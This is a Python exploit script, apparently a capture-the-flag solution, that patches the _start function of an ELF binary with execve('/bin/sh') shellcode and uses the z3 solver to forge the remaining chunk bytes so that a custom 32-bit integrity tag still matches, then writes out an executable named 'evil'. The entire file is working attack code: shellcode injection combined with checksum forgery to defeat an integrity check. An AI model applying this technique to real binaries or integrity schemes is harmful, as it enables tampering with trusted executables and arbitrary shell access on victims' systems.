import pwn
import z3
import os

pwn.context.arch = "amd64"
chunk_size = 0x100


def calc_tag(buf):
    res = 0x20210828
    i = 0
    for i in range(chunk_size):
        c = buf[i]
        res = (res ^ c) >> 1 | (((res ^ c) & 1) ^ 1) << 31
    return res


def sym_calc_tag(buf):
    # Symbolically calculate the tag
    res = z3.BitVecVal(0x20210828, 32)
    i = 0
    for i in range(chunk_size):
        c = z3.ZeroExt(res.size() - buf[i].size(), buf[i])
        a = z3.LShR(res ^ c, 1)
        b = (((res ^ c) & 1) ^ 1) << 31
        res = a | b
    return res


def split_chunks(elf):
    return [elf[i : i + chunk_size] for i in range(0, len(elf), chunk_size)]


def find_chunk(chunks, needle):
    for i, chunk in enumerate(chunks):
        if needle in chunk:
            padded_chunk = chunk.ljust(chunk_size, b"\x00")  # calloc
            return i, chunk, calc_tag(padded_chunk)
    else:
        raise ValueError("Needle not found")


with open("sample.elf", "rb") as f:
    elf = f.read()

# These are the bytes in the `_start` function
needle = bytes.fromhex(
    "f30f1efa31ed4989d15e4889e24883e4f050544c8d0566010000488d0def000000488d3dc1000000ff15522f0000f490"
)

chunks = split_chunks(elf)
chunk_i, old_chunk, old_tag = find_chunk(chunks, needle)

tag = calc_tag(old_chunk)
assert tag == old_tag

needle_start = old_chunk.find(needle)

shcode = """mov rdi, 0x68732f6e69622f
push rdi
mov eax, 0x3b
mov rdi, rsp
mov rsi, 0
mov rdx, 0
syscall
"""

shcode = pwn.asm(shcode)

sym_chunk = z3.BitVecs(" ".join([f"buf_{i}" for i in range(chunk_size)]), 8)

# Avoid clobbering code before our shellcode
for i in range(needle_start):
    sym_chunk[i] = z3.BitVecVal(old_chunk[i], 8)

# Add our shellcode
for i, b in enumerate(shcode):
    sym_chunk[needle_start + i] = z3.BitVecVal(shcode[i], 8)

sym_tag = sym_calc_tag(sym_chunk)

solver = z3.Solver()
solver.add(sym_tag == old_tag)

print(solver.check())
model = solver.model()

evil_chunk = bytes(model.evaluate(c).as_long() for c in sym_chunk)
assert calc_tag(evil_chunk) == old_tag

evil_chunks = chunks
evil_chunks[chunk_i] = evil_chunk
evil_elf = b"".join(evil_chunks)

with open("evil", "wb") as f:
    f.write(evil_elf)
    os.chmod(f.name, 0o755)
